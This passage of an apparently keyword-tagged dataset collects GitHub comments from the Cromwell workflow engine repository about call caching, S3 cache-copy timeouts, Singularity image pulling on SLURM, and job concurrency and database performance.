FastqAndBwaMem:0:1",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046:44,cache,cached,44,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726476046,3,['cache'],['cached']
Performance,> We'll need 5GB (no joke!) . Hmm it doesn't seem like a good idea to load a 5GB file over network in Cromwell's memory 😄,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2768#issuecomment-338301969:70,load,load,70,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2768#issuecomment-338301969,1,['load'],['load']
Performance,"> You can create a new submission with the same inputs and Cromwell will read from call-cache (i.e. skip) tasks it has already done.; > ; > https://cromwell.readthedocs.io/en/stable/cromwell_features/CallCaching/ https://support.terra.bio/hc/en-us/articles/360047664872-Call-caching-How-it-works-and-when-to-use-it. ah I see, thanks for pointing me here",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6752#issuecomment-1116276070:88,cache,cache,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6752#issuecomment-1116276070,1,['cache'],['cache']
Performance,> a cache blast + restart is looking better. thanks!,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5489#issuecomment-617369958:4,cache,cache,4,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5489#issuecomment-617369958,1,['cache'],['cache']
Performance,"> for me. The cromwell server always checks the existence of the cached file; > before the copying finishes. In Cromwell v51 and before, some small files; > <100GB were able to be successfully cached. However, with Cromwell v53,; > even a 6GB result file got a problem of caching and has to rerun. Is there; > any way to prevent the timeout of the actor?; >; > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded,; > multipart copies to improve the size of results that may be cached. There; > are also additional improvements that have recently been merged into dev; > and should appear in the next release version (or you could build from; > source) v52+ requires a new AWS configuration. Instructions are in; > https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > … <#m_3227077625045957240_>; > On Sat, Oct 24, 2020 at 8:27 PM Luyu *@*.***> wrote: Hi, I got a timeout; > exception during cache copying on AWS S3. The cache file size is 133GB.; > Given the file size, more time should be allowed for cache copying. Is; > there any config option that can tune this? Thank you in advance for any; > suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure; > copying cache results for job; > BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo; > FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out; > waiting for a response to copy s3://xxxxx/cromwell-execution/Germ; > line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136; > /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to; > s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488; > 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u; > nmerged.bam) — You are receiving th",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055:1685,cache,cache,1685,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-726473055,1,['cache'],['cache']
Performance,"> it's mostly a mystery what the summarizer is up to. 🤔 If we didn't want to log updates, maybe yet-another graphite metric to see summarization throughput?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4757#issuecomment-475105132:145,throughput,throughput,145,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4757#issuecomment-475105132,1,['throughput'],['throughput']
Performance,"> would just need to keep in mind they do the lookup to get the docker size. @illusional well I suppose a `docker_size` argument can just as easily be implemented. After pulling the image can be queried for size. > After BCC2020 I want to revisit this PR, and could allow you to turn off the digest but keep call caching on?. Nope. Not yet anyway. And the code is intrically linked, so it is not going to be a one-liner fix. So this is why I have postponed working on this. This is an interesting thing to revisit at a later date. We use singularity containers on a SLURM backend, using the `singularity-permanent-cache` program to pull the images. For us that really works well, and our login node has contact with the internet, so this change is not really urgent. But for stability it is always nice if an internet connection is not required anymore after all the images are there.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-661652343:614,cache,cache,614,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-661652343,1,['cache'],['cache']
Performance,"> 是的，很酷，当您指定一个 docker 时，Cromwell 必须解析映像摘要才能使调用缓存正常工作。; > ; > 如果 Cromwell 无法在线找到 docker，或者您的代理阻止了 Cromwell，或者该映像不在线，则映像摘要无法正确解析，并且调用缓存处于禁用状态。; > ; > 这里有一些进一步的上下文： #6140. I also learned this from the official documents. Our cluster individual cannot use Docker, nor can it be connected to the Internet, so we have to choose between mirroring and Call-cache. Thank you very much for your answer.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047374011:349,cache,cache,349,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-1047374011,2,['cache'],['cache']
Performance,">For what it's worth, most Cromwell users today use cloud storage which has APIs. @aednichols probably that is the reason why many bugs in local backend are ignored and there are still no way to clean cache through API. At local backend cache is not only slow but also works only half of the time ( https://github.com/broadinstitute/cromwell/issues/6143 ). In our case, our lab has our own servers, so we do not have to spend money on cloud, but cache pain is quite high, we are evaluating if it is worth migrating from cromwell to snakemake",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-797074823:201,cache,cache,201,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6213#issuecomment-797074823,3,['cache'],['cache']
Performance,"@Horneth Call cache copying seems to be working! It's relatively slow during ""Backend is copying Cached Outputs"", but the other tasks that run don't get stuck in ""Queued in Cromwell"" or ""Cromwell Overhead"". So I'd say that it works with traditional (not just the file path) call caching. . I don't have a thread dump with file path CC on but I could rerun it.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-289095387:14,cache,cache,14,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-289095387,3,"['Cache', 'Queue', 'cache']","['Cached', 'Queued', 'cache']"
Performance,"@Horneth From what @ruchim and @rtitle said, it made a huge performance difference on FC alpha. Which makes sense as that list was getting appended to and we do a lot of appending there.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2486#issuecomment-317813217:60,perform,performance,60,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2486#issuecomment-317813217,1,['perform'],['performance']
Performance,"@Horneth There are certainly tradeoffs and I don't disagree w/ what you said. However consider the flip side - by defining A Validation Actor you're allowing for more granular control over performance and fault tolerance down the road, e.g. you could replace it with a router talking to a bank of VAs and doing load balancing, fiddle with its own threadpool, provide validation specific supervision in case of error, etc.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195399500:189,perform,performance,189,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195399500,2,"['load', 'perform']","['load', 'performance']"
Performance,"@Horneth Yeah, almost exactly that. The only beef I have w/ that is that I'd call the ephemeral VAs behind it as a premature optimization, but it is certainly a valid optimization. Similarly maybe there are N fixed VAs behind it or something like that (I'm not advocating for either).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195429261:125,optimiz,optimization,125,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195429261,2,['optimiz'],['optimization']
Performance,@Horneth could you add a cache configuration option that will switch on caring about the filenames when caching?; Non-chaching of filenames can get many users in a really big trouble and sometimes screw whole research or medical diagnosis. If I did not discover that the files were not written because of caching my colleagues would have treated cow data as if it was human.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351129209:25,cache,cache,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351129209,1,['cache'],['cache']
Performance,"@Horneth here is my metadata. I enclose first run from which the cache was created. There I made a mistake in input and gave graywhale_in_human_blastp output name for the cow data. In two runs that followed I tried to fix this mistake by giving graywhale_in_cow_blastp instead, but it cached the copy task from the first run, so nothing changed.; [metadata_false_positive.zip](https://github.com/broadinstitute/cromwell/files/1551960/metadata_false_positive.zip)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351070649:65,cache,cache,65,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351070649,2,['cache'],"['cache', 'cached']"
Performance,"@KevinDuringWork, I guess thanks to you for making N2D, one of the best CPU families on GCP, available on Terra. T2D (AMD Milan) now offers the best price-to-performance ratio. I'm still new to software development. Could you add support to T2D or guide me on how I can accomplish this? thank you very much!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6380#issuecomment-1485124010:158,perform,performance,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6380#issuecomment-1485124010,2,['perform'],['performance']
Performance,"@LeeTL1220 @Horneth I doubt enabling continue on return would work. You are getting timeouts not only when uploading log files, but also when localizing files. Ive observed this occasionally to with wide scatters and multiple workflows. ; It starting to seem more like an api Issue. I know in the cromwell conf there is a property for setting the total number of concurrent workflows, but I do not know if this is extended to the task level. It would be interesting to see whether or not limiting the number of concurrent tasks in a scatter would have any impact on this. That or better scattering the task submission for scatters instead of submitting all tasks basically at once. This is one of our major pain points too. So far the only reasonable solution we have had (other then adjusting api quotas) is just to tell users to rerun a wf",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300177559:363,concurren,concurrent,363,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300177559,2,['concurren'],['concurrent']
Performance,"@LeeTL1220 @Horneth I ran into similar issues when running > 400 Tasks Simultaneously. I would occasionally get 403 from the JES backend from various causes; - size built in function would timeout ; - Pulling the docker image from gcr.io would time out; - occasionally pulling the docker image from docker hub would also time out; - I also observed the above error that you were experiencing as well. I was not able to debug any of them, because of the transient nature. Rerunning the workflow generally fixed the problem. I am also using preemptible instances for the majority of the tasks that were being run, however I do not see how that could be contributing to the issue. If anything i would guess that we are bumping into an api quota and are being throttled by google leading to the timeouts",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300167322:756,throttle,throttled,756,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-300167322,1,['throttle'],['throttled']
Performance,"@LeeTL1220 if you ran this in a server mode Cromwell, I suggest having a look at the Call Cache Diff endpoint to work out what really caused this call cache miss and in the mean time close this issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-331262988:90,Cache,Cache,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-331262988,2,"['Cache', 'cache']","['Cache', 'cache']"
Performance,"@LeeTL1220 there is doc in the README and CHANGELOG (in this PR) on how to disable it.; For SGE, since it doesn't honor the docker runtime attribute I don't think there can be false positive because of that. ; On a backend that does honor the docker attribute, if a tag is used, then yes it can yield false positives if the tag is updated, since Cromwell won't lookup the hash.; There can be false negatives though on SGE, if you change the value of the docker attribute in the WDL, it won't call cache, although it could because SGE will ignore the docker value anyway.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2139#issuecomment-292010784:497,cache,cache,497,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2139#issuecomment-292010784,1,['cache'],['cache']
Performance,"@LeeTL1220 whats the driving force behind wanting to run with GCS files locally? It would seem most cost effective (by not having to pay egress at all) to run compute to in GCP. However, if you want to use on-prem resources specifically, then simply make a copy a local copy of workflow inputs to start off with. I think this is an interesting optimization but not really a widespread use case and adds more complexity to how Cromwell has to handle localization strategies. I'm inclined to close this issue but feel free to re-open if this essential to your flow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1348#issuecomment-424954064:344,optimiz,optimization,344,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1348#issuecomment-424954064,2,['optimiz'],['optimization']
Performance,"@TMiguelT I've moved the singularity cache section back down. Hopefully this is all the comments actioned. Sorry @vsoch, I realised I've been resolving your comments as I actioned them, but I probably should've left them open as they're from your review. Also sorry for what was probably a lot of email spam over the past few hours.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-465407558:37,cache,cache,37,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-465407558,1,['cache'],['cache']
Performance,"@TMiguelT for suggesting flock. Together with `singularity exec` I think it can solve this particular use case. The `SINGULARITY_CACHEDIR` environment variable needs to be set to a location on the cluster. Then the following config can work:. ```; SLURM {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory""; config {; concurrent-job-limit = 200; exit-code-timeout-seconds = 120; # 4G Memory by default; runtime-attributes= """"""; Int cpu = 1; Int? memory; String? docker; Int time_minutes = 120; """"""; submit-docker = """"""; # Singularity pull image. ; if [ -z $SINGULARITY_CACHEDIR ]; ; then CACHE_DIR=$HOME/singularity/cache; else CACHE_DIR=$SINGULARITY_CACHEDIR; fi; mkdir -p $CACHE_DIR; LOCK_FILE=$CACHE_DIR/singularity_pull_flock; # flock should work as this is executed at the same node as cromwell.; flock --verbose --exclusive --timeout 900 $LOCK_FILE singularity exec --containall docker://${docker} echo ""succesfully pulled ${docker}!"". # Partition selection; PARTITION=all; MEMORY=${default=""4294967296"" memory}; if [ ${time_minutes} -lt 60 ]; then PARTITION=short; fi; if [ $MEMORY -gt 107374182400 ] ; then PARTITION=highmem ; fi. # Job submission; sbatch \; --partition=$PARTITION \; --job-name=""${job_name}"" \; --chdir=""${cwd}"" \; --time=""${time_minutes}"" \; --cpus-per-task=""${cpu}"" \; --mem=$(echo ""$MEMORY / 1024^2"" | bc) \; --output=""${out}"" \; --error=""${err}"" \; --wrap \; 'singularity exec --containall --bind /shared_cluster_dir,${cwd}:${docker_cwd} docker://${docker} sh ${script}; rc=$?; if [ ! -f ${cwd}/execution/rc ]; then; echo ""$rc"" > ${cwd}/execution/rc; fi'; """"""; kill = ""scancel ${job_id}""; kill-docker = ""scancel ${job_id}""; check-alive = ""squeue -j ${job_id}""; job-id-regex = ""Submitted batch job (\\d+).*""; ``` . EDIT: I changed the config. Instead of using multiple locks (one lock per image) there is now one universal lock. This is because pulling two images at the same time that have a shared layer might also corrupt the cache.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430:2531,cache,cache,2531,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627379430,1,['cache'],['cache']
Performance,"@Thib; - Are there docs somewhere? So that I can see how to disable the lookup.; - Doesn't this leave SGE open to false alarm call cache hits when using; tags?. On Tue, Apr 4, 2017 at 9:34 AM, Thib <notifications@github.com> wrote:. > *@Horneth* commented on this pull request.; > ------------------------------; >; > In src/bin/travis/resources/centaur.inputs; > <https://github.com/broadinstitute/cromwell/pull/2139#discussion_r109662641>; > :; >; > > @@ -1,7 +1,7 @@; > {; > ""centaur_workflow.centaur.cromwell_jar"":""gs://cloud-cromwell-dev/travis-centaur/CROMWELL_JAR"",; > ""centaur_workflow.centaur.centaur_branch"":""CENTAUR_BRANCH"",; > - ""centaur_workflow.centaur.conf"":""gs://cloud-cromwell-dev/travis-centaur/multiBackend.conf"",; > + ""centaur_workflow.centaur.conf"":""gs://cloud-cromwell-dev/travis-centaur/multiBackendDockerLookup.conf"",; >; > Revert before merging; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/pull/2139#pullrequestreview-30778280>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXkya-uKJyJCAUfDENTCs3BFzbwoY3ks5rskbLgaJpZM4MyKO1>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2139#issuecomment-291508178:131,cache,cache,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2139#issuecomment-291508178,1,['cache'],['cache']
Performance,"@aednichols . I implemented the changes. The lock should have a negligible performance impact. It only locks when cached-copy strategy is used, threads which use other strategies are not blocked by this. (This was already true before the changes). A dictionary is used to keep track which files are being copied within the process. Filesystem lock files are too slow for this because during scatters cromwell creates a lot of threads that need exactly the same file at the same time. . A lock file is now used so other cromwell processes know the file is being copied. The chances of two processes needing the same file at exactly the same time is negligible, so lock files are fast enough here. Due to the `synchronized` lock, there can not be race conditions where more than one thread modifies the dictionary and/or creates the lock file at the same time. (The lock is absolutely necessary for cached-copy to work). The amount of time spent in the lock per thread is negligible. . I implemented a waitOnCopy function which lets a thread wait for the locks in the dictionary on the filesystem to clear. This structure allows a lot of paths to be copied to the cache at the same time. So the copying is still multithreaded, maintaining high performance. Are these changes satisfactory?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-488295703:75,perform,performance,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-488295703,12,"['cache', 'perform', 'race condition']","['cache', 'cached-copy', 'performance', 'race conditions']"
Performance,@aednichols Is there anything else I need to do for this or is it waiting in the review queue?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-785295218:88,queue,queue,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-785295218,1,['queue'],['queue']
Performance,"@aednichols tested that just now. The experience is similar to the ""I don't have git hooks installed"" case (ie see the two final `[error]` messages):; ```; $ sbt compile; [...]; [info] Executing in batch mode. For better performance use sbt's shell; [info] Executing pre-compile script...; [error] You are not running our custom git commit hooks. If you are making changes to the codebase, we recommend doing this (by running 'git config --add core.hooksPath hooks/') to ensure that your cryptographic secrets are not committed to our repository by accident.; [error] If you don't want to set up hooks (if you never intend to commit to the cromwell repo, can be sure that you won't commit secrets by accident, or have already installed git-secrets in this repo separately), you can suppress this error by running with: 'sbt -Dignore-hooks-check=true [...]'; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5060#issuecomment-510938820:221,perform,performance,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5060#issuecomment-510938820,1,['perform'],['performance']
Performance,"@aednichols we didn't talk about it yesterday since some folks were out, so we can talk at the next refinement instead. Short story is... we weren't actually batching those requests anyway from a database perspective so I don't think any performance was lost. I also have a cool trick to share about how to see actually what the database is doing that i used to figure this out.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4508#issuecomment-451267229:238,perform,performance,238,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4508#issuecomment-451267229,1,['perform'],['performance']
Performance,"@aednichols, @ruchim is correct, it's why the JMUI really doesn't perform well (Sometimes crashes) when thousands of workflows with subworkflows are submitted, because we do what you've described for filtering out subworkflows in a paginated way on the front end. This is the issue described in #3240. I appreciate the question though, although we have been making changes to cromwell API to support JMUI, it is worth thinking through each one and which team should be accommodating the use case.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3608#issuecomment-394418950:66,perform,perform,66,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3608#issuecomment-394418950,1,['perform'],['perform']
Performance,"@aednichols. No problem. It also turns out that the SQLite file database performs rather slowly. This is due to cromwell doing a lot of transactions, and these are severely bottlenecked by filesystem i/o limits. The amount of i/o operations per second on NFS is rather low so it chokes cromwell performance quite a bit when running a job with multiple samples. This shows that there is room for improvement in Cromwell's design (why are there more than a hundred thousand database interactions for a 2000 job run?) but that is another matter entirely.; HSQLDB with overflow file has problems of its own, but it is more performant (once the 10 GB+ file has been read at least). This branch works, so if the need arises I can maintain a separate release of cromwell with these changes patched in. I have done that before for some changes in dev that could not wait. For now much much thanks for all your support in getting it this far :heart:.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857:73,perform,performs,73,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-802583857,4,"['bottleneck', 'perform']","['bottlenecked', 'performance', 'performant', 'performs']"
Performance,"@alartin - the concurrent-job-limit limits how many jobs will be in a ""runnable / running"" state at a time. It also has the side effect of limiting how many jobs are submitted when the workflow starts. Scatter jobs do not currently map to AWS Batch Array jobs. It would definitely be a good thing to implement and it would also be an effective way to avoid API request limits.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-442973335:15,concurren,concurrent-job-limit,15,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-442973335,1,['concurren'],['concurrent-job-limit']
Performance,"@antonkulaga @cjllanwarne ; I have tested call-caching with hardlinks and cached-copy strategy. For hashing-strategy I used path+modtime. These were the results for the call-caching:. **It works!**. So this part of the docs should be updated indeed. I have no idea why it works though, so I am a bit hesitant to add it to the docs. @cjllanwarne Do you know if anything changed in the code base that made the call-caching work for hard links?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-513136831:74,cache,cached-copy,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4077#issuecomment-513136831,1,['cache'],['cached-copy']
Performance,"@antonkulaga It appears that changing the `name` only changes the filename of the output produced by your task, but not the actual processing. So I bet if you look at the files produced by the diamond blast task for all 3 workflows you'll see that even though their names differ they have the same content.; Cromwell by default only cares about the content of a file with respect to call caching and its name is ignored. In this case it likely md5ed the files and found they had the same hash so the copy task was cached.; I'll wait for you to confirm that the output files have indeed the same hash before closing this:. ```; md5 /pipelines/cromwell_1/cromwell-executions/Diamond_Blast/ab101af5-26ba-45c8-b592-fb37e06a523d/call-diamond_blast/execution/graywhale_in_human_blastp.m8; md5 /pipelines/cromwell_1/cromwell-executions/Diamond_Blast/3d75657d-7dc9-4b6f-bbc8-ae579a3fa773/call-diamond_blast/execution/graywhale_in_cow_blastp.m8; md5 /pipelines/cromwell_1/cromwell-executions/Diamond_Blast/276d6f9e-15b1-4dc3-a8a7-889414406511/call-diamond_blast/execution/graywhale_in_cow_blastp.m8; ```. should all produce the same hash",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351125450:514,cache,cached,514,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3044#issuecomment-351125450,1,['cache'],['cached']
Performance,"@aofarrel I recommend setting a [`concurrent-job-limit`](https://cromwell.readthedocs.io/en/stable/backends/Backends/) value of 1 so that Cromwell only starts one job at once. . The interface between Cromwell and its backends is designed so that resource management happens entirely within the backend. As such, Cromwell never knows how much memory/CPU a backend has; rather the backend is expected to start as many jobs as it can safely handle and stop when it reaches the limit. What you're finding is that the local backend, implemented with Docker, doesn't support that self-management because it is a non-goal of the Docker product itself. Docker tries to start whatever containers you request, immediately. Since I _think_ `concurrent-job-limit` should fully address your problem, I am going to close the issue. If that's not the case feel free to reopen.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-803082272:34,concurren,concurrent-job-limit,34,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2365#issuecomment-803082272,2,['concurren'],['concurrent-job-limit']
Performance,"@cjllanwarne -- my understanding is that the read/write functions can't be optionally performed in the command, since the write and read involve file functions --which tend to happen upstream of the command being initiated?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-496240424:86,perform,performed,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4981#issuecomment-496240424,1,['perform'],['performed']
Performance,"@cjllanwarne @mcovarr you guys are the lucky reviewers! Making the changes to publish cache hit metadata that includes Workflow ID, call name and job index of the source cache hit call.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1447#issuecomment-248118103:86,cache,cache,86,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1447#issuecomment-248118103,2,['cache'],['cache']
Performance,@cjllanwarne BA-5904 is the JIRA peer to this PR which in no way improves performance. 😉 I agree that the JIRA peers to the PRs that actually do improve performance should get a User Impact like what you describe.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5112#issuecomment-520824354:74,perform,performance,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5112#issuecomment-520824354,2,['perform'],['performance']
Performance,"@cjllanwarne Checkout out #199, a PR into this PR. It refactors `DataAccess`, `Backend`, and `BackendType` around a bit such that the high level workflow manager actor can pass in its data access instance to the backend, OR the various test suites can keep using separate data access instances. . The problem with ""data_access_singleton"" is that the singleton data access seemingly cannot handle the onslaught of our multi-threaded tests. One of our many thread pools around the database seemed to then start returning uncaught(?) errors. Definitely showed some warts in our non-existent load testing... Take a look, decide what you want to keep or jettison, but I do believe that a new database pool / data access should **NOT** be created for each JES `Run`. Otherwise, this branch looks good to go for merge. :+1:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143000894:417,multi-thread,multi-threaded,417,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143000894,2,"['load', 'multi-thread']","['load', 'multi-threaded']"
Performance,"@cjllanwarne I agree now that fix will not work, but what i don't see we can perform Topological sort because we have seq of calls instead dependency graph ( Correct me if i am wrong?).",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1214#issuecomment-236050063:77,perform,perform,77,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1214#issuecomment-236050063,1,['perform'],['perform']
Performance,"@cjllanwarne I certainly don't think this needs a unit test for a hotfix. And as there was no unit test added for the introduction of the queue, and many unit and virtually all integration tests exercise this indirectly I'm not sure I see the necessity.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5510#issuecomment-624861371:138,queue,queue,138,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5510#issuecomment-624861371,1,['queue'],['queue']
Performance,"@cjllanwarne I'd prefer to see it talking to a single point (currently a single VA, as @Horneth & I discussed, if performance, reliability or complexity call for it, to be morphed into something else). I don't care that much if it happens here, but it's not an onerous change to make on this PR. I _will_ care once something else is talking to a VA",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195440254:114,perform,performance,114,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-195440254,1,['perform'],['performance']
Performance,"@cjllanwarne I'm probably misreading the convo but I was reading this to imply that a cromwell-singleton data access object would be getting hit harder from running our unit tests in terms of connections than real life, but in the latter we could conceivably have many thousands of workflows (and thus many, many thousands of tasks) banging on the DB simultaneously. A teensy threadpool isn't going to be able to handle the latter case. Another possibility (which we originally looked at but discarded for non-singleton data access) is to have an actual data access actor, and then that actor can scale horizontally as needed via a router actor. those actors can even be on different machines if CPU load is an issue.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143033225:700,load,load,700,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/198#issuecomment-143033225,1,['load'],['load']
